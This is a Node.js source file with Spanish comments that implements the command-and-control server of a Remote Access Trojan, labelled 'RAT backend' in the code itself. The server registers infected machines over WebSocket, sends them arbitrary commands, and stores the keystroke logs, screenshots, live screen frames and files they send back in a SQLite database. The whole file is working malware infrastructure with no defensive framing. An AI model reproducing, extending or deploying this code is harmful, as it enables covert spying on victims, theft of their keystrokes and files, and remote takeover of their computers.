const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Base de datos SQLite
const db = new sqlite3.Database(path.join(__dirname, 'rats.db'));
db.run(`CREATE TABLE IF NOT EXISTS clients (
  id TEXT PRIMARY KEY,
  customName TEXT,
  ip TEXT,
  lastSeen INTEGER,
  os TEXT,
  hostname TEXT
)`);

db.run(`CREATE TABLE IF NOT EXISTS commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  clientId TEXT,
  command TEXT,
  params TEXT,
  status TEXT DEFAULT 'pending',
  result TEXT,
  timestamp INTEGER
)`);

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const activeClients = new Map();

// ============ WEBSOCKET ============
wss.on('connection', (ws, req) => {
  const clientId = req.headers['x-client-id'] || 'unknown-' + Date.now();
  const ip = req.socket.remoteAddress || '0.0.0.0';
  const hostname = req.headers['x-hostname'] || 'unknown';

  db.run(`INSERT OR REPLACE INTO clients (id, ip, lastSeen, hostname) VALUES (?, ?, ?, ?)`,
    [clientId, ip, Date.now(), hostname]);

  activeClients.set(clientId, ws);
  console.log(`[+] Cliente conectado: ${clientId} desde ${ip}`);

  const interval = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    } else {
      clearInterval(interval);
      activeClients.delete(clientId);
      db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
    }
  }, 5000);

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      console.log('[+] Mensaje del cliente:', data.type);

      if (data.type === 'pong') {
        db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
      }

      // ===== GUARDAR RESULTADOS DE COMANDOS =====
      if (data.type === 'cmd_result') {
        db.get(
          `SELECT id FROM commands WHERE clientId = ? AND status = 'pending' ORDER BY timestamp DESC LIMIT 1`,
          [clientId],
          (err, row) => {
            if (row) {
              db.run(
                `UPDATE commands SET result = ?, status = 'done' WHERE id = ?`,
                [data.result, row.id]
              );
              console.log(`[+] Resultado guardado para comando ${row.id}`);
            } else {
              db.run(
                `INSERT INTO commands (clientId, command, params, result, status, timestamp) VALUES (?, ?, ?, ?, 'done', ?)`,
                [clientId, 'unknown', '', data.result, Date.now()]
              );
            }
          }
        );
      }

      // ===== SCREENSHOT =====
      if (data.type === 'screenshot_result') {
        db.run(
          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'screenshot', ?, 'done', ?)`,
          [clientId, JSON.stringify({ image: data.image }), Date.now()]
        );
        console.log(`[+] Screenshot guardado para ${clientId}`);
      }

      // ===== STREAM FRAME =====
      if (data.type === 'stream_frame') {
        db.run(
          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'stream', ?, 'done', ?)`,
          [clientId, JSON.stringify({ image: data.image }), Date.now()]
        );
        console.log(`[+] Stream frame recibido de ${clientId}`);
      }

      // ===== KEYLOG =====
      if (data.type === 'keylog') {
        console.log(`[+] Keylog de ${clientId}: ${data.text}`);
        // Guardar keylog en tabla separada si se desea
        db.run(
          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'keylog', ?, 'done', ?)`,
          [clientId, data.text, Date.now()]
        );
      }

      // ===== FILE DOWNLOAD =====
      if (data.type === 'file_download') {
        db.run(
          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'files', ?, 'done', ?)`,
          [clientId, JSON.stringify({ filename: data.filename, data: data.data, size: data.size }), Date.now()]
        );
        console.log(`[+] Archivo ${data.filename} recibido (${data.size} bytes)`);
      }

      // ===== INFO =====
      if (data.type === 'info') {
        db.run(`UPDATE clients SET os = ? WHERE id = ?`, [data.os, clientId]);
        console.log(`[+] Info de ${clientId}: ${data.os}`);
      }
    } catch (e) {
      console.log('[-] Error en mensaje:', e.message);
    }
  });

  ws.on('close', () => {
    clearInterval(interval);
    activeClients.delete(clientId);
    db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
    console.log(`[-] Cliente desconectado: ${clientId}`);
  });
});

// ============ API REST ============

// Obtener lista de clientes
app.get('/api/clients', (req, res) => {
  db.all('SELECT * FROM clients ORDER BY lastSeen DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const result = rows.map(c => ({
      ...c,
      online: activeClients.has(c.id)
    }));
    res.json(result);
  });
});

// Renombrar cliente
app.post('/api/rename', (req, res) => {
  const { id, customName } = req.body;
  if (!id || !customName) return res.status(400).json({ error: 'Faltan datos' });
  db.run('UPDATE clients SET customName = ? WHERE id = ?', [customName, id], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ ok: true });
  });
});

// Enviar comando a un cliente
app.post('/api/command', (req, res) => {
  const { clientId, command, params } = req.body;
  if (!clientId || !command) return res.status(400).json({ error: 'Faltan datos' });

  const ws = activeClients.get(clientId);
  if (!ws) return res.status(404).json({ error: 'Cliente no conectado' });

  const cmdId = Date.now();
  const cmdObj = { id: cmdId, command, params: params || '' };
  ws.send(JSON.stringify({ type: 'command', data: cmdObj }));

  db.run(`INSERT INTO commands (clientId, command, params, timestamp) VALUES (?, ?, ?, ?)`,
    [clientId, command, JSON.stringify(params || ''), Date.now()]);

  res.json({ ok: true, cmdId });
});

// Obtener historial de comandos de un cliente
app.get('/api/commands/:clientId', (req, res) => {
  const { clientId } = req.params;
  db.all('SELECT * FROM commands WHERE clientId = ? ORDER BY timestamp DESC LIMIT 50',
    [clientId], (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json(rows);
    });
});

// Obtener comandos específicos por tipo (ej: screenshots, streams)
app.get('/api/commands/:clientId/:type', (req, res) => {
  const { clientId, type } = req.params;
  db.all('SELECT * FROM commands WHERE clientId = ? AND command = ? ORDER BY timestamp DESC LIMIT 20',
    [clientId, type], (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json(rows);
    });
});

// Ruta raíz
app.get('/', (req, res) => {
  res.json({
    status: 'RAT Backend running',
    clients: activeClients.size,
    uptime: process.uptime()
  });
});

// Iniciar servidor
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] Servidor RAT backend corriendo en puerto ${PORT}`);
  console.log(`[+] Clientes activos: 0`);
});
